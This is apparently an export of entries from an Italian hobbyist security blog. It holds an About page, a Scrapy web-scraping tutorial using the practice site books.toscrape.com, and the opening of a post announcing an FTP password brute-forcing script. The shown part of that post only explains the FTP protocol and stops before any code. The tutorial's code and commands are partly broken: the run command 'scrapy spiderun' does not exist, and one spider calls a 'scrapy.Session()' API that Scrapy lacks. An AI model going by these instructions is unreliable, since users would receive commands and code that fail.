[{"categories":null,"contents":"Mi chiamo Lombardi Angelo Nunzio, in arte, k0Br@3390 e questo √® SpaceHack, il mio blog. Su di esso troverai contenuti di informatica, programmazione e cyber security. Questo spazio serve a me come valvola di sfogo nel parlare a chi √® davvero interessato a questo mondo e a coloro che sono interessati davvero a questo mondo come il sottoscritto. Detto questo, happy coding e sopratutto, happy hacking üëΩ.\n[ Github ]\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/about/","tags":null,"title":"About"},{"categories":["Tutorial"],"contents":" Table Of Contents:\n Introduzione al modulo Esempi Pratici  Estrazione del titolo di una pagina web Estrazione dei prezzi dei libri da una pagina web Estrazione di tutte le informazioni sui libri da una pagina web Estrazione di tutte le informazioni sui libri da pi√π pagine web Estrazione di informazioni sui libri da una pagina web utilizzando un\u0026rsquo;espressione regolare Estrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV Scraping di dati da pi√π siti Scraping di dati da una pagina con autenticazione Scraping di dati da una pagina AJAX Scraping di dati da una pagina utilizzando una sessione Scraping di tutti i prezzi dei libri su tutte le pagine Scraping di tutti i titoli e le categorie dei libri Scraping delle immagini dei libri Scraping dei prezzi dei libri in un formato specifico (es. JSON)     Introduzione al modulo Scrapy √® un modulo Python open-source per il web scraping. √à stato progettato per estrarre i dati da siti web in modo efficiente e rapido. Scrapy offre una serie di funzionalit√† avanzate per il web scraping, tra cui la gestione delle richieste, la navigazione del sito, la selezione dei dati tramite XPath o CSS selector e la gestione dei cookie.\nIl modulo Scrapy utilizza una struttura ad albero per rappresentare il contenuto di una pagina web. Ci√≤ consente agli sviluppatori di selezionare facilmente i dati desiderati utilizzando i selettori CSS e XPath. Inoltre, Scrapy fornisce una serie di metodi per navigare il sito web come segue: seguire i link, inviare form e gestire i cookie.\nScrapy √® anche progettato per essere utilizzato in modo scalabile, √® in grado di gestire grandi quantit√† di dati e di supportare il parallelismo. Il modulo supporta anche la persistenza dei dati, consentendo di salvare i dati estratti in un formato specifico, come CSV, JSON o XML.\nPer creare un progetto con Scrapy, √® necessario creare un nuovo progetto utilizzando il comando scrapy startproject, quindi creare un nuovo spider utilizzando il comando scrapy genspider. In seguito si definiscono le regole di scraping nella funzione parse() del proprio spider.\nIn sintesi Scrapy √® uno strumento molto potente per estrarre i dati dal web, grazie alla sua flessibilit√† e alle sue funzionalit√† avanzate, √® possibile creare spider in grado di estrarre dati da siti web complessi e navigare attraverso pi√π pagine.\n Disclaimer: ‚ö†Ô∏è Il web scraping √® una pratica legale a meno che non violi le condizioni d\u0026rsquo;uso del sito web in questione. Il presente software √® stato creato per scopi educativi e di ricerca e non deve essere utilizzato per violare le leggi o i termini d\u0026rsquo;uso di un sito web. L\u0026rsquo;utente √® responsabile dell\u0026rsquo;utilizzo del software e degli eventuali danni causati dall\u0026rsquo;utilizzo improprio. ‚ö†Ô∏è\n Per installare e configurare uno progetto con il modulo scrapy possiamo usare i seguenti step:\nInstallare Scrapy: √® possibile farlo utilizzando il comando seguente nella riga di comando:\npip install scrapy Oppure per Python3:\npip3 install scrapy Creare un nuovo progetto: Per creare un progetto √® possibile utilizzare il comando nella riga di comando:\nscrapy startproject \u0026lt;nome_progetto\u0026gt; Dove \u0026lt;nome_progetto\u0026gt; √® il nome del progetto che si desidera creare. Questo comando creer√† una nuova cartella con il nome del progetto, che conterr√† i file di configurazione e la struttura del progetto.\nCreare un nuovo spider: utilizzare il comando seguente nella riga di comando:\nscrapy genspider \u0026lt;nome_spider\u0026gt; \u0026lt;dominio\u0026gt; Dove \u0026lt;nome_spider\u0026gt; √® il nome del spider che si desidera creare e  √® il dominio del sito web da cui si desidera estrarre i dati. Questo comando creer√† un nuovo file spider nella cartella \u0026ldquo;spiders\u0026rdquo; del progetto. Il comando richiede il nome dello spider e l\u0026rsquo;URL di partenza per lo spider. Esempio:\nscrapy genspider example example.com Questo creer√† un file chiamato example.py all\u0026rsquo;interno della cartella spiders del tuo progetto, con una classe di spider chiamata ExampleSpider che inizia a estrarre i dati dall\u0026rsquo;URL example.com.\nUna volta creato lo spider, √® possibile modificare il codice per soddisfare le esigenze del progetto. In seguito, lo spider pu√≤ essere eseguito utilizzando il comando:\nscrapy spiderun \u0026lt;nome_spider\u0026gt;.py Extra: ExampleSpider √® il nome della classe dello spider generato automaticamente dal comando scrapy genspider con il nome che gli hai dato quando hai creato lo spider.\nLa classe estende la classe base scrapy.Spider e include una serie di propriet√† e metodi predefiniti che puoi utilizzare per configurare e eseguire lo spider.\nPer esempio, nella classe √® presente il nome dello spider name e gli url di partenza start_urls che specificano l\u0026rsquo;indirizzo web a cui si vuole fare scraping, la funzione di callback parse() che viene chiamata quando lo spider recupera una pagina web.\nL\u0026rsquo;idea √® che tu possa modificare questa classe e adattarlo alle tue esigenze specifiche, aggiungendo eventuali selettori CSS o XPath, gestione dei cookies, trattamento dei dati, ecc.\nModificare il codice del spider: aprire il file spider appena creato e modificare il codice per adattarlo alle esigenze del progetto. √à possibile utilizzare il metodo start_requests() per specificare la URL iniziale da cui iniziare a estrarre i dati, il metodo parse() per specificare come estrarre i dati dalle pagine web, e il metodo parse_item() per specificare come estrarre i dati da un singolo elemento della pagina web.\nEseguire lo spider: Come citato in precedenza √® possibile utilizzare il comando seguente nella riga di comando per eseguire lo spider:\nscrapy spiderun \u0026lt;nome_spider\u0026gt;.py Dove \u0026lt;nome_spider\u0026gt; √® il nome del spider creato in precedenza. In questo modo, verranno stampati i dati estratti nella console o salvati in un file, a seconda delle impostazioni specificate nel codice. Per eseguire lo spider bisogna trovarsi nella directory spiders.\nRicordati che √® possibile utilizzare anche il comando\nscrapy shell \u0026lt;url\u0026gt; Questo per testare il codice del tuo spider su una singola pagina web, prima di lanciare la scansione sull\u0026rsquo;intero sito.\nDi seguito vediamo degli esempi usando come URL: http://books.toscrape.com/ che viene usato appositamente per il Web Scraping.\nNota: durante l‚Äôesecuzione del codice possono esserci errori per la mancanza del modulo attrs, per installarlo usiamo il comando:\npip install attrs Oppure per Python3:\npip3 install attrs Se abbiamo gi√† questo modulo, possiamo aggiornarlo con il comando:\npip install --upgrade attrs Esempi Pratici Estrazione del titolo di una pagina web import scrapy class TitleSpider(scrapy.Spider): name = \u0026#34;titlespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), } Questo codice crea uno spider chiamato TitleSpider che estende la classe base scrapy.Spider. Nella classe, viene definito un nome per lo spider e una lista di URL di partenza per lo spider. Nel nostro caso, l\u0026rsquo;URL di partenza √® una pagina web di un negozio di libri online.\nLa funzione parse() √® chiamata ogni volta che lo spider recupera una pagina web. All\u0026rsquo;interno della funzione parse(), utilizziamo un ciclo for per scorrere tutti gli elementi HTML che corrispondono al selettore article.product_pod. Questo selettore seleziona tutti gli elementi  con la classe product_pod nella pagina web.\nPer ogni elemento selezionato, utilizziamo il selettore h3 \u0026gt; a::text per selezionare il testo del primo elemento  all\u0026rsquo;interno dell\u0026rsquo;elemento  all\u0026rsquo;interno dell\u0026rsquo;elemento . Il testo selezionato rappresenta il titolo del libro. Utilizziamo la funzione get() per restituire il valore del titolo del libro come una stringa. Infine, utilizziamo yield per restituire un dizionario contenente il titolo del libro. Alla fine del ciclo for, lo spider avr√† raccolto tutti i titoli dei libri presenti nella pagina web di partenza.\nEstrazione dei prezzi dei libri da una pagina web import scrapy class PriceSpider(scrapy.Spider): name = \u0026#34;pricespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } Questo codice √® un esempio di uno spider di Scrapy che estrae i prezzi dei libri da una pagina web specifica.\nLa classe PriceSpider estende la classe base scrapy.Spider e include alcune propriet√† e metodi specifici per questo spider.\n La propriet√† name assegna un nome allo spider, in questo caso \u0026ldquo;pricespider‚Äù La propriet√† start_urls specifica gli URL di partenza per lo spider, in questo caso l\u0026rsquo;indirizzo \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026rdquo;  La funzione parse() √® il metodo di callback chiamato quando lo spider recupera una pagina web, questa funzione √® responsabile di estrarre i dati dalla pagina.\nLa funzione utilizza un ciclo for per ciclare attraverso ogni elemento HTML con classe article.product_pod, questi elementi rappresentano ogni libro presente sulla pagina.\nPer ogni libro, utilizza il selettore CSS .price_color per individuare il prezzo del libro, e utilizza il metodo get() per recuperare il testo del prezzo. Il prezzo estratto viene quindi aggiunto ad un dizionario come valore della chiave \u0026ldquo;price\u0026rdquo; e restituito attraverso l\u0026rsquo;istruzione yield.\nIn sintesi, questo spider recupera la pagina web specificata, estrae i prezzi di ogni libro presente sulla pagina e li restituisce come una serie di dizionari, dove ogni dizionario rappresenta un libro e contiene solo una chiave price con il relativo prezzo del libro.\nEstrazione di tutte le informazioni sui libri da una pagina web import scrapy class BookSpider(scrapy.Spider): name = \u0026#34;bookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } Questo codice mostra come creare uno spider chiamato \u0026ldquo;bookspider\u0026rdquo; utilizzando il modulo Scrapy in Python. Lo spider inizia a navigare nell\u0026rsquo;indirizzo web specificato in \u0026ldquo;start_urls\u0026rdquo;, che in questo caso √® \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa funzione parse() viene chiamata per ogni pagina visitata dallo spider e consente di analizzare il contenuto della pagina. In questo esempio, la funzione parse() utilizza il metodo \u0026ldquo;css\u0026rdquo; per selezionare tutti gli elementi HTML con la classe \u0026ldquo;product_pod\u0026rdquo; e li itera uno per uno.\nPer ogni elemento, vengono estratte tre informazioni:\n Il titolo del libro utilizzando il selettore \u0026ldquo;h3 \u0026gt; a::text\u0026rdquo;, che seleziona il testo all\u0026rsquo;interno del tag \u0026ldquo;a\u0026rdquo; immediatamente figlio del tag \u0026ldquo;h3\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article‚Äù Il prezzo utilizzando il selettore \u0026ldquo;.price_color::text\u0026rdquo;, che seleziona il testo all\u0026rsquo;interno del tag con classe \u0026ldquo;price_color\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article‚Äù La valutazione utilizzando il selettore \u0026ldquo;.star-rating::attr(class)\u0026rdquo;, che seleziona il valore dell\u0026rsquo;attributo \u0026ldquo;class\u0026rdquo; del tag con classe \u0026ldquo;star-rating\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article\u0026rdquo;. Poi si utilizza il metodo \u0026ldquo;split\u0026rdquo; per dividere la stringa in una lista di stringhe, e si prende l\u0026rsquo;ultima parte della stringa cio√® l\u0026rsquo;ultimo elemento della lista.  Tutte queste informazioni vengono quindi restituite come un dizionario utilizzando il comando \u0026ldquo;yield\u0026rdquo; all\u0026rsquo;interno del ciclo for.\nEstrazione di tutte le informazioni sui libri da pi√π pagine web import scrapy class MultiPageBookSpider(scrapy.Spider): name = \u0026#34;multipagebookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } next_page = response.css(\u0026#34;li.next \u0026gt; a::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.parse) Questo codice √® un esempio di uno spider Scrapy che utilizza un ciclo for per estrarre informazioni da pi√π pagine di un sito web.\nIl nome dello spider √® multipagebookspider e la pagina iniziale da cui inizia la scansione √® \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa funzione parse √® chiamata per ogni pagina e utilizza il metodo css per estrarre informazioni sui libri dalla pagina (titolo, prezzo e valutazione).\nSuccessivamente, utilizza il metodo css per estrarre il link alla prossima pagina e utilizza il metodo response.follow per seguire il link e chiamare nuovamente la funzione parse per la pagina successiva. Ci√≤ consente allo spider di continuare a estrarre informazioni dalle pagine successive finch√© non viene raggiunta la fine del sito.\nEstrazione di informazioni sui libri da una pagina web utilizzando un\u0026rsquo;espressione regolare import scrapy import re class RegexBookSpider(scrapy.Spider): name = \u0026#34;regexbookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): title = book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get() price = book.css(\u0026#34;.price_color::text\u0026#34;).get() rating = book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get() availability = book.css(\u0026#34;p.availability::text\u0026#34;).get() match = re.search(r\u0026#39;\\d+\u0026#39;, availability) if match: stock = int(match.group(0)) yield { \u0026#34;title\u0026#34;: title, \u0026#34;price\u0026#34;: price, \u0026#34;rating\u0026#34;: rating, \u0026#34;stock\u0026#34;: stock } Questo √® un esempio di codice scritto in Python utilizzando la libreria Scrapy per creare un spider chiamato RegexBookSpider.\nIn particolare, questo spider √® impostato per iniziare la navigazione nella pagina \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e utilizza l\u0026rsquo;espressione regolare (regex) per estrarre informazioni sul numero di copie disponibili di ciascun libro.\nIl metodo parse √® chiamato per ogni pagina visitata dallo spider e utilizza il selettore CSS per selezionare i dati di interesse nella pagina. In questo caso, il spider estrae il titolo, il prezzo, la valutazione e la disponibilit√† di ogni libro. L\u0026rsquo;espressione regolare re.search(r'\\d+', availability) √® utilizzata per cercare una corrispondenza di un numero intero all\u0026rsquo;interno della stringa di disponibilit√†. Se una corrispondenza viene trovata, il numero di stock disponibili viene salvato in una variabile chiamata \u0026ldquo;stock\u0026rdquo;. Infine, le informazioni estratte vengono restituite come un dizionario.\nEstrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV import scrapy class BookSpiderCSV(scrapy.Spider): name = \u0026#34;bookspidercsv\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] custom_settings = { \u0026#34;FEED_FORMAT\u0026#34;: \u0026#34;csv\u0026#34;, \u0026#34;FEED_URI\u0026#34;: \u0026#34;books.csv\u0026#34;, } def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } Questo codice √® un esempio di uno spider Scrapy che raccoglie informazioni sui libri presenti su un sito web di esempio \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e le salva in un file CSV. Il nome dello spider √® \u0026ldquo;bookspidercsv\u0026rdquo; e la classe principale √® BookSpiderCSV che estende la classe base scrapy.Spider.\nLa propriet√† start_urls specifica l\u0026rsquo;URL iniziale del sito web da cui lo spider inizier√† a raccogliere i dati.\nLa funzione parse viene eseguita per ogni pagina del sito web raccolta dallo spider. In questo caso, utilizza il metodo response.css per selezionare tutti gli elementi HTML con la classe product_pod dalla pagina, che rappresentano i libri. Per ogni libro, raccoglie il titolo, il prezzo e la valutazione utilizzando il metodo \u0026ldquo;css\u0026rdquo; e salva i dati raccolti in un dizionario.\nLa propriet√† custom_settings imposta il formato del file di output e il nome del file di output. In questo caso, il formato √® impostato su csv e il nome del file su books.csv.\nAlla fine, tutti i dati raccolti dalla funzione parse vengono scritti nel file CSV books.csv nella cartella radice del progetto.\nScraping di dati da pi√π siti import scrapy class MultiSiteBookSpider(scrapy.Spider): name = \u0026#34;multisitebookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, \u0026#34;http://books.toscrape.com/catalogue/category/books/science_23/index.html\u0026#34;] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza un elenco di URL di partenza start_urls che contiene pi√π di un sito web. Utilizzando un solo metodo parse() per estrarre i dati, lo spider esegue la scansione di entrambi i siti web specificati nel elenco e estrae i dati dei libri dalle pagine web.\nScraping di dati da una pagina con autenticazione import scrapy from scrapy.http import FormRequest class MySpider(scrapy.Spider): name = \u0026#34;myspider\u0026#34; start_urls = [ \u0026#34;https://mywebsite.com/login\u0026#34;, ] def parse(self, response): # estraiamo il token CSRF dalla pagina di login csrf_token = response.css(\u0026#34;input[name=\u0026#39;csrf_token\u0026#39;]::attr(value)\u0026#34;).get() # creiamo una richiesta di form con i dati di login e il token CSRF yield FormRequest.from_response(response, formdata={ \u0026#34;username\u0026#34;: \u0026#34;myusername\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;mypassword\u0026#34;, \u0026#34;csrf_token\u0026#34;: csrf_token }, callback=self.after_login) def after_login(self, response): # controlliamo se siamo stati autenticati con successo if \u0026#34;Incorrect username or password\u0026#34; in response.body: self.logger.error(\u0026#34;Login fallito\u0026#34;) return # se siamo stati autenticati con successo, possiamo iniziare a fare scraping for item in response.css(\u0026#34;div.item\u0026#34;): yield { \u0026#34;title\u0026#34;: item.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: item.css(\u0026#34;span.price::text\u0026#34;).get(), \u0026#34;image_url\u0026#34;: item.css(\u0026#34;img::attr(src)\u0026#34;).get() } # e possiamo anche seguire i link per le pagine successive next_page = response.css(\u0026#34;a.next_page::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.after_login) In questo modo, il spider inizia visitando la pagina di login, estrae il token CSRF e invia una richiesta di form con i dati di login e il token. Quindi, utilizza la funzione after_login come callback per gestire la risposta della richiesta di form. In questa funzione, il spider controlla se l\u0026rsquo;autenticazione √® stata eseguita con successo e, in caso contrario, registra un errore. In caso contrario, il spider inizia a fare scraping dei dati e a seguire i link per le pagine successive.\nScraping di dati da una pagina AJAX import scrapy class AJAXBookSpider(scrapy.Spider): name = \u0026#34;ajaxbookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/ajax\u0026#34;] def parse(self, response): # Invia una richiesta POST per ottenere i dati dei libri tramite AJAX yield scrapy.FormRequest( \u0026#34;http://books.toscrape.com/catalogue/category/books/ajax\u0026#34;, formdata={\u0026#34;page\u0026#34;: \u0026#34;2\u0026#34;}, callback=self.parse_ajax_response ) def parse_ajax_response(self, response): # Estraiamo i dati dei libri dalla risposta AJAX for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza il metodo scrapy.FormRequest() per inviare una richiesta POST con i dati del form AJAX alla pagina web. La risposta AJAX contiene i dati dei libri che vengono estratti dalla pagina utilizzando il metodo parse_ajax_response().\nScraping di dati da una pagina utilizzando una sessione import scrapy class SessionBookSpider(scrapy.Spider): name = \u0026#34;sessionbookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;] def start_requests(self): # Iniziamo una sessione self.session = scrapy.Session() # Effettuiamo il login return [self.session.post(\u0026#34;http://books.toscrape.com/login\u0026#34;, data={\u0026#34;username\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34;})] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza una sessione per effettuare il login alla pagina web prima di iniziare a estrarre i dati. Utilizzando il metodo start_requests() per effettuare il login e il metodo parse() per estrarre i dati, lo spider mantiene la sessione attiva durante tutto il processo di scraping.\nScraping di tutti i prezzi dei libri su tutte le pagine import scrapy class AllPricesSpider(scrapy.Spider): name = \u0026#34;allpricesspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } next_page = response.css(\u0026#34;li.next \u0026gt; a::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.parse) Questo codice √® un esempio di uno spider Scrapy che estrae i prezzi di tutti i libri presenti sul sito \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e li salva in un formato predefinito.\nIl codice importa la libreria di scrapy, quindi definisce una classe AllPricesSpider che estende la classe base scrapy.Spider.\nLa classe ha un nome univoco name e una lista di URL da cui iniziare a raccogliere i dati start_urls.\nIl metodo parse √® chiamato per ogni pagina visitata e utilizza la funzione response.css per selezionare tutti gli elementi article.product_pod sulla pagina. Per ogni elemento selezionato, estrae il prezzo utilizzando la selezione .price_color::text e lo salva in un dizionario.\nInfine, il codice cerca il link per la pagina successiva, se esiste, utilizzando la funzione \u0026ldquo;response.css(\u0026ldquo;li.next \u0026gt; a::attr(href)\u0026quot;).get()\u0026rdquo; e segue il link utilizzando la funzione \u0026ldquo;response.follow(next_page, self.parse)\u0026rdquo; per continuare a raccogliere dati dalle successive pagine.\nScraping di tutti i titoli e le categorie dei libri import scrapy class TitleCategorySpider(scrapy.Spider): name = \u0026#34;titlecategoryspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;category\u0026#34;: response.css(\u0026#34;nav \u0026gt; ul \u0026gt; li.active \u0026gt; a::text\u0026#34;).get(), } Questo codice utilizza la libreria scrapy per estrarre dati da una pagina web. In particolare, il codice crea una classe chiamata TitleCategorySpider che estrae i titoli dei libri e la categoria dei libri dalla pagina web \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa classe TitleCategorySpider estende la classe scrapy.Spider e definisce un metodo parse che viene chiamato quando la pagina specificata in start_urls √® scaricata.\nIl metodo parse utilizza il metodo response.css per selezionare gli elementi delle pagine web. Utilizza il metodo css per selezionare gli elementi article.product_pod dalla pagina web. Per ogni elemento selezionato, utilizza il metodo css di nuovo per estrarre il titolo del libro (\u0026ldquo;h3 \u0026gt; a::text\u0026rdquo;) e la categoria del libro (\u0026ldquo;nav \u0026gt; ul \u0026gt; li.active \u0026gt; a::text\u0026rdquo;) e quindi li salva in un dizionario.\nIl metodo yield √® utilizzato per restituire il dizionario come risultato del metodo parse. In questo modo, scrapy sa che il risultato deve essere raccolto e utilizzato per qualcos\u0026rsquo;altro, come la scrittura su un file o la memorizzazione in un database.\nScraping delle immagini dei libri import scrapy class BookImageSpider(scrapy.Spider): name = \u0026#34;bookimagespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;image_urls\u0026#34;: book.css(\u0026#34;img::attr(src)\u0026#34;).getall(), } Il codice utilizza la libreria scrapy per creare uno spider chiamato bookimagespider che inizia a navigare dalla pagina \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nIl metodo parse(self, response) viene chiamato per ogni pagina visitata dallo spider. Il metodo cerca tutti gli elementi HTML con classe product_pod che rappresentano i libri nella pagina. Per ogni elemento trovato, estrae il titolo del libro e l\u0026rsquo;URL dell\u0026rsquo;immagine del libro.\nL\u0026rsquo;URL dell\u0026rsquo;immagine del libro viene estratto tramite il metodo .css(\u0026ldquo;img::attr(src)\u0026quot;).getall() che seleziona tutti gli elementi img e estrae l\u0026rsquo;attributo src. Il risultato √® una lista di URL delle immagini dei libri.\nQuesti dati estratti vengono quindi restituiti come un dizionario con le chiavi title e image_urls.\nScraping dei prezzi dei libri in un formato specifico (es. JSON) import scrapy class PriceSpiderJSON(scrapy.Spider): name = \u0026#34;pricespiderjson\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] custom_settings = { \u0026#34;FEED_FORMAT\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;FEED_URI\u0026#34;: \u0026#34;prices.json\u0026#34;, } def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } Questo codice utilizza la libreria scrapy per creare uno spider chiamato PriceSpiderJSON, che inizia a navigare nella pagina web \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e recupera i prezzi dei libri presenti su quella pagina. Utilizza il metodo parse() per elaborare la risposta ottenuta dalla pagina web e recuperare i prezzi. Il metodo yield {} serve per generare un dizionario di output contenente la propriet√† \u0026ldquo;price\u0026rdquo; con il prezzo del libro.\nIl dizionario custom_settings definisce il formato del feed e il nome del file in cui verranno salvati i dati recuperati dallo spider. In questo caso il feed verr√† salvato in formato JSON con nome prices.json.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/basi-sul-modulo-scrapy/basi_sul_modulo_scrapy/","tags":["Web Scraping","Python","Spider"],"title":"Basi sul Modulo Scrapy"},{"categories":["Tutorial","Network Attacks"],"contents":"Table Of Contents:\n Basi sul Protocollo FTP Configurazione di un Server FTP con Vsftpd Brute Forcing delle credenziali di un server FTP con Python Prova sul Campo   In questo post andr√≤ a spiegare come √® possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos\u0026rsquo;√® il protocollo FTP.\nBasi sul Protocollo FTP Ftp √® l‚Äôacronimo di File Transfer Protocol esso √® un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso per√≤ permette anche la navigazione veloce nella struttura di un server web dove sono presenti file. √â uno dei protocolli pi√π vecchi di Internet. Gi√† a partire dal 1974 si inizia a lavorare con la tecnologia di trasmissione dei file completi. Nel 1985 si definisce con esattezza il FTP nel documento Request For Comments 959. Il protocollo ftp √® un protocollo indipendente quindi √® possibile usarlo su qualsiasi computer, indipendentemente dal sistema operativo che vi si usa. Questo servizio viene usato anche nella posta odierna, questo perch√©, anche essendo un protocollo datato permette il trasferimento di file di notevoli dimensioni. C‚Äô√® una distinzione da fare tra ftp pubblico e ftp privato:\n  ftp pubblico: viene definito tale quando un client esegue il download su un sito web, o su un qualsiasi sito che permette di scaricare file durante la navigazione in questo caso pu√≤ essere chiamato anche anonymous ftp.\n  ftp privato: se ad esempio un provider mette a disposizione uno spazio web, directory comprese per fare il download e upload dei file html esso viene definito ftp privato o full service ftp.\n  Il File Transfer Protocol viene eseguito all‚Äôinterno del livello applicativo dello stack TCP/IP, ossia nello stesso livello di HTTP o POP. Questi protocolli si caratterizzano per il loro funzionamento in combinazione con i programmi, come browser o client di posta elettronica, grazie ai quali svolgono la propria funzione. Anche per il File Transfer Protocol esistono dei software FTP dedicati. Per stabilire una connessione FTP vengono aperti due canali. Per prima cosa client e server creano un canale di controllo tramite la porta 21, tramite il quale il client invia comandi al server e questo risponde con i codici di stato. Dopodich√© entrambi possono creare un canale dati che trasporta i file desiderati da una parte all‚Äôaltra. Il protocollo controlla eventuali errori.\n√à necessario distinguere per√≤ tra FTP attivo e passivo. Nella variante attiva √® il client a stabilire la connessione, come spiegato, attraverso la porta 21 e a comunicare al server su quale porta lato cliente questo pu√≤ inviare la propria risposta. Ma se il client √® protetto da un firewall, allora il server non potr√† inviare alcuna risposta in quanto tutte le connessioni esterne sono bloccate. Proprio per questi casi √® stata sviluppata una modalit√† passiva, che prevede che sia il server a rendere nota la porta tramite la quale il client pu√≤ creare il canale dati. In questo modo, essendo il client a iniziare la connessione, il firewall non blocca il trasferimento dei dati. Il File Transfer Protocol dispone di vari comandi e codici di stato. Grazie a ben 32 comandi totali - non sempre necessariamente tutti implementati dal server - il client istruisce il server su qual √® l‚Äôoperazione desiderata:\n caricare o scaricare file organizzare 